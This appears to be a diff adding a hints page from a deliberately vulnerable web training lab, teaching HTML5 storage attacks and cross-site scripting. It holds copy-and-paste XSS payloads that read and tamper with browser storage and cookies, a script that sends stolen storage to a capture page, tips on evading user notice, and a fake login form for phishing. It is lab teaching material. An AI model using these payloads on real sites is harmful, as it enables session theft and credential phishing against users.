@@ -1,0 +1,380 @@
+
+DOM Injection
+
+Use Firebug or similar to examine the message that appears when a new item is
+added to storage. The message appears in a label below the two input fields.
+Inject XSS into the "key" field. This is output into the message. Craft a XSS
+to read the DOM storage or perform other action.
+
+HTML5 Storage API
+
+The Storage interface of the browser API
+							
+interface Storage {
+	readonly attribute unsigned long length;
+	DOMString? key(unsigned long index);
+	getter DOMString getItem(DOMString key);
+	setter creator void setItem(DOMString key, DOMString value);
+	deleter void removeItem(DOMString key);
+	void clear();
+}
+
+An "interface" is a software class that is only a definition in itself and must
+be implemented to work. The Storage interface is implemented twice in the
+browser as part of the "Window" DOM object. One implementation is the "Local
+Storage" object named "localStorage" and the other is the "Session Storage"
+object named "sessionStorage".
+
+To call the methods defined in the interface, call them using the "window"
+scope.
+
+Example:
+
+// grab local session storage
+var m = "";
+var l = window.localStorage;
+for(i=0;i<length;i++){
+	var lKey = l.key(i);
+	m += lKey + "=" + l.getItem(lKey) + "; ";
+}// end for i
+alert(m);
+
+Locating pages which use HTML5 storage
+
+Pages using HTML5 storage are easy to locate since the source code is
+client-side. The JavaScript API specifies the session storage objects are named
+sessionStorage and localStorage which are both properties of the window object.
+Developers may put the JavaScript in an included file, so check for JavaScript
+include file and search the source code for "sessionStorage" and
+"localStorage".
+
+Reading HTML5 storage from the Browser
+
+The values a site has placed into your browser can be read by you. They can
+also be changed by you. Developers should know better than to place any type of
+authentication token anywhere on the client, but this problem has existed well
+before HTML5 storage and will continue with HTML storage.
+If the web developer is trying to hide something in session storage or local
+storage that you want to read, you can type JavaScript into your browser
+address bar to read the HTML 5 storage. Cookies in general should not contain
+any information classified above "public". Developers are constantly making the
+mistake of thinking that because cookies happen to be difficult to view, they
+cannot be viewed. Functionally, HTML 5 storage is analogous to a big cookie.
+
+In some browsers, you can run JavaScript against the current page by placing
+the prefix "javascript" followed by a colon and your JavaScript into the
+address bar.
+
+Try It (Newer Firefox require you allow JavaScript in URL bar (about:config)):
+
+javascript:alert("It Works!");
+
+NOTE: If new browsers disable JavaScript in the URL bar, install a real-time
+page editor such as FireBug. In Firebug, open the "console" and use the
+command-line area at the bottom (Look for ">>>").
+
+HTML5 storage provides an API for interaction with JavaScript. Therefore if you
+are using a page that uses HTML5 storage, you can read it with a JavaScript.
+(The HTML5 storage is on your browser, so you may just be able to use the
+browser itself.)
+
+This script can read HTML5 storage from the page currently being browsed:
+
+<script>
+	try{
+		var m = "";
+		var l = window.localStorage;
+		var s = window.sessionStorage;
+		
+		for(i=0;i<l.length;i++){
+			var lKey = l.key(i);
+			m += lKey + "=" + l.getItem(lKey) + ";\n";
+		};
+
+		for(i=0;i<s.length;i++){
+			var lKey = s.key(i);
+			m += lKey + "=" + s.getItem(lKey) + ";\n";
+		};
+		
+		alert(m);
+	}catch(e){
+		alert(e.message);
+	}
+</script>
+
+Copy and Paste:
+
+
+// JavaScript Alert Box version
+<script>try{var m = "";var l = window.localStorage; var s =
+window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey +
+"=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m
++= lKey + "=" + s.getItem(lKey) +
+";\n";};alert(m);}catch(e){alert(e.message);}</script>
+
+
+// window.document.write version
+<script>try{var m = "";var l = window.localStorage;var s =
+window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey +
+"=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m
++= lKey + "=" + s.getItem(lKey) +
+";\n";};window.document.write(m);}catch(e){alert(e.message);}</script>
+
+
+// Fireug console.log() or console.debug() version
+// NOTE: This version must be executed in the Firebug console
+try{var m = "";var l = window.localStorage;var s =
+window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey +
+"=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m
++= lKey + "=" + s.getItem(lKey) +
+";\n";};console.log(m);}catch(e){alert(e.message);}
+
+Except in SECURE mode, this page has some "secrets" hidden in the HTML5
+storage. To figure out what are the items, use a JavaScript injection in the
+Back button or the page footer (HTTP user-agent header) to inject your own
+JavaScript. An easier way would be to remember that all the HTML5 storage and
+all JavaScript is client-side which means it is running on your machine. You
+can simply read the JavaScript that set the storage items.
+
+Injecting values into session storage
+
+If you are visiting a web site utilizing HTML5 storage, the storage is on your
+browser so injecting values is relatively easy but remember that HTML5 storage
+is stored by domain, protocol, and port so any code used to set storage values
+must be done in the context of the target page.
+
+This script will inject the following keys with the following values into the
+current page context. This context will be valid as long as the domain,
+protocol, and port do not change.
+
+<script>
+	localStorage.setItem("AccountNumber","123456");
+	sessionStorage.setItem("EnterpriseSelfDestructSequence","A1B2C3");
+	sessionStorage.setItem("SessionID","japurhgnalbjdgfaljkfr");		
+	sessionStorage.setItem("CurrentlyLoggedInUser","1233456789");
+</script>
+
+Copy and Paste:
+
+<script> localStorage.setItem("AccountNumber","123456");
+sessionStorage.setItem("EnterpriseSelfDestructSequence","A1B2C3");
+sessionStorage.setItem("SessionID","japurhgnalbjdgfaljkfr");
+sessionStorage.setItem("CurrentlyLoggedInUser","1233456789"); </script>
+
+After setting the values, read them back for confirmation. Use the scripts
+under section "Reading HTML5 storage". In fact, we can combine the two scripts
+and run them back to back.
+<script> localStorage.setItem("AccountNumber","123456");
+sessionStorage.setItem("EnterpriseSelfDestructSequence","A1B2C3");
+sessionStorage.setItem("SessionID","japurhgnalbjdgfaljkfr");
+sessionStorage.setItem("CurrentlyLoggedInUser","1233456789"); try{var m =
+"";var l = window.localStorage;var s = window.sessionStorage;
+for(i=0;i<l.length;i++){ var lKey = l.key(i); m += lKey + "=" + l.getItem(lKey)
++ ";\n";}; for(i=0;i<s.length;i++){ var lKey = s.key(i); m += lKey + "=" +
+s.getItem(lKey) + ";\n";}; alert(m);}catch(e){ alert(e.message); } </script>
+
+
+Over-writing existing HTML5 storage values
+
+Determine what the existing key-value pairs are in the HTML5 storage. Use the
+scripts under section "Reading HTML5 storage". Choose the key-value pair to
+set. Finally use a script to over-write the key-value pair. Note that the
+setItem() methods adds a new key-value pair if the key does not already exist
+but over-writes the current value if the key is present.
+
+A smaller script can be used to read the currently stored keys:
+
+<script> var s = sessionStorage; var l = localStorage; var m = "";
+for(i=0;i<s.length;i++){m += "sessionStorage:" + s.key(i) + ";\n";}
+for(i=0;i<l.length;i++){m += "localStorage:" + l.key(i) + ";\n";} alert(m);
+</script>
+
+One of the keys on this page is "MessageOfTheDay". To change that particular
+value, we can use another script:
+
+<script>localStorage.setItem("MessageOfTheDay","Hello World"); </script>
+
+Depending on when this script is injected, the page may not display the
+changes. An inspection of the code reveals that the page calls a function
+"init()" in order to display the current values. Calling "init()" again after
+changing the value should show the change. Watch carefully. The page will
+display HTML5 storage from the initial call to init() then display all the
+values again. Notice the message of the day is different in the second listing.
+Here is the modified script.
+
+<script>localStorage.setItem("MessageOfTheDay","Hello World"); init();</script>
+
+One problem is the user might notice the page is not the same. Instead of one
+"MessageOfTheDay" there are now two; the original message plus the new message
+added by the cross-site script. To solve this issue, first overwrite the
+original message, then delete all the table rows being displayed. To delete the
+messages, use JavaScript to alter the DOM on the page. Finally call the pages
+own init() function to redraw the table.
+Hint: Click "View Source" and read the JavaScript in the init() function. It
+shows that the "idSessionStorageTableBody" is the HTML DOM element to which the
+table rows are added.
+
+<script>localStorage.setItem("MessageOfTheDay","Hello World"); var
+node=window.document.getElementById("idSessionStorageTableBody");
+while(node.hasChildNodes()){node.removeChild(node.firstChild)};
+init();</script>
+
+
+Reading another users HTML5 storage
+
+If you want to read someone elses session storage or local storage, remember
+where the storage is located. The storage is on the client machine and is only
+accessible by scripts running in their browser. Therefore you need to get your
+JavaScript to run on that users machine. One way to do this is to either plant
+a persistent cross site script (XSS) and wait for the user to visit the
+infected site or phish using a reflected cross site script.
+
+If injecting JavaScript into HTML, using a body-onload event or an image tag
+can be effective without overtly alerting the user. JavaScript can also be
+injected by wrapping the JavaScript code in script tags.
+
+If injecting JavaScript into existing JavaScript code, using an XHR (aka AJAX
+aka Web 2.0) script is a good way to inject scripts because the resulting
+script execution is less likely to be noticed by the user.
+
+We can collect the HTML5 storage using the same script as in "Reading HTML5
+Storage" but instead of displaying the data in a popup alert box we can send
+the data to a capture page.
+
+<script>
+	try{ 
+		var s = sessionStorage;
+		var l = localStorage;
+		var m = "";
+		var lXMLHTTP;
+					
+		for(i=0;i<s.length;i++){
+			m += "sessionStorage(" + s.key(i) + "):" + s.getItem(s.key(i)) + ";
+";
+		}
+
+		for(i=0;i<l.length;i++){
+			m += "localStorage(" + l.key(i) + "):" + l.getItem(l.key(i)) + ";
+";
+		}
+
+		var lAction =
+"http://localhost/mutillidae/capture-data.php?html5storage=" + m; 
+		lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange =
+function(){}; 
+		lXMLHTTP.open("GET", lAction); 
+		lXMLHTTP.send(""); 
+	}catch(e){} 
+</script>
+
+Copy and Paste:
+
+<script> try{ var s = sessionStorage; var l = localStorage; var m = ""; var
+lXMLHTTP; for(i=0;i<s.length;i++){ m += "sessionStorage(" + s.key(i) + "):" +
+s.getItem(s.key(i)) + "; "; } for(i=0;i<l.length;i++){ m += "localStorage(" +
+l.key(i) + "):" + l.getItem(l.key(i)) + "; "; } var lAction =
+"http://localhost/mutillidae/capture-data.php?html5storage=" + m; lXMLHTTP =
+new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){};
+lXMLHTTP.open("GET", lAction); lXMLHTTP.send(""); }catch(e){} </script>
+
+Try injecting JavaScript into the user-agent HTTP header because it is
+displayed in the footer.
+
+Where is this page vulnerable to cross site scripting
+
+The add new key field is vulnerable to HTML injection and event based
+JavaScript injection because the keys that are added by the user are reflected
+back when the page inserts the key into the span using the innerHTML property.
+
+For example, the following key can injected along with any value.
+
+</span><span onmouseover="alert(1);">ERROR</span><span>
+
+The "BACK" button is vulnerable to JavaScript injection and the page footer
+displays the value of the user-agent string making it vulnerable as well.
+
+The most practical vulnerabilities is the users message. Note the site does not
+output encode the username or the users message. These values are database
+values meaning they present a persistent cross site script.
+ 
+Cross-Site Scripting Tutorial
+
+Cross-Site Scripting occurs because a script is displayed in page output but is
+not properly encoded. Because of the lack of proper encoding, the browser will
+execute the script rather than display it as data. Pages that encode all
+dynamic output are generally immune. The page will simply display the script as
+text rather than execute the script as code.
+
+The first step to Cross-Site Scripting is to determine which of the sites input
+is displayed as output. Some input is immediately output on the same or next
+page. These pages are candidates for reflected Cross-Site Scripting. Some input
+may be stored in a database and output later on the appropriate page. These
+situations may be ripe for the most dangerous type of XSS; persistent XSS.
+
+Developers may treat input from forms carefully, while completely ignoring
+input passed via URL Query Parameters, Cookies, HTTP Headers, Logs, Emails,
+etc. The key is to encode ALL output and not just output that came into the
+site via forms/POST.
+
+Discovery Methodology
+
+Step 1: For each page under scrutiny, enter a unique string into each form
+field, url query parameter, cookie value, HTTP Header, etc., record which value
+has which unique string, submit the page, then observe the resulting page to
+see if any of your unique strings appeared. Upon finding a unique string, note
+which value had contained that string and record this on your map.
+
+Unfortunately the input could end up as output on any page within the site, all
+pages within the site, or none of them. If the values are not reflected
+immediately but presented on a later page (for example in search results) then
+it should be assumed the value is stored in a database.
+
+Step 2:The second step is to test all the input locations from step #1 with
+various scripts, css, html tags, etc. and observe the resulting output. If the
+site fails to encode output, it is a candidate for XSS.
+
+Methodology: Enter interesting characters such as angle brackets for HTMLi and
+XSS, Cascading style sheet symbols, etc. to see if the site encodes this
+output. If the site does not encode output, try inserting XSS, CSS, HTML, etc.
+and watch for execution. If the site has a WAF, this is likely the point at
+which you will detect the WAF presence.
+
+Examples
+
+Many examples can be found at http://ha.ckers.org/xss.html
+
+This example is of stealing a cookie. This could be reflected or persistent. To
+make this persistent, try to get the script stored into a database field which
+is later output onto a web page.
+
+<script>alert('Cookies which do not have the HTTPOnly attribute set: ' +
+document.cookie);</script>
+
+Same example with the single-quotes escaped for databases such as MySQL. This
+allows the XSS to be stored in the database. When the web site (or another
+site) pulls the XSS from the database at a later time, it will be served with
+the site content.
+
+<script>alert(\'Cookies which do not have the HTTPOnly attribute set: \' +
+document.cookie);</script>
+
+Cross site scripting will work in any unencoded output. It does not matter if
+the value being output initially came from a form field (usually POST) or URL
+parameteres (GET). If fact the value can come from any source. For example, if
+a web page outputs the user-agent string in whole or part, you can use a tool
+such as User-Agent Switcher plug-in for Firefox to attempt XSS via the
+User-Agent HTTP Header. Any HTTP Header can be forged with or without tools. If
+you would like to forge an HTTP Header without tools, try Netcat. Other options
+include intercepting and changing the web request after the request leaves the
+browser. Burp Suite is an excellent tool to try on your own machine. Try
+changing the user-agent to the XSS examples on this page. Also, try this sample
+HTML injection. The XSS could be directly placed into the database then pulled
+later. This can happen from a hacked database, a rouge DBA, or via SQL
+injection such as with ASPROX. This is why output encoding is a better defense
+than input validation for XSS. If the XSS makes it into the database but never
+has to pass through the validation to get there, input validation will not
+work.
+
+<h1>Sorry. There has been a system error.<br /><br />Please login
+again</h1><br/>Username<input type="text"><br/>Password<input
+type="text"><br/><br/><input type="submit" value="Submit"><h1>&nbsp;</h1> 
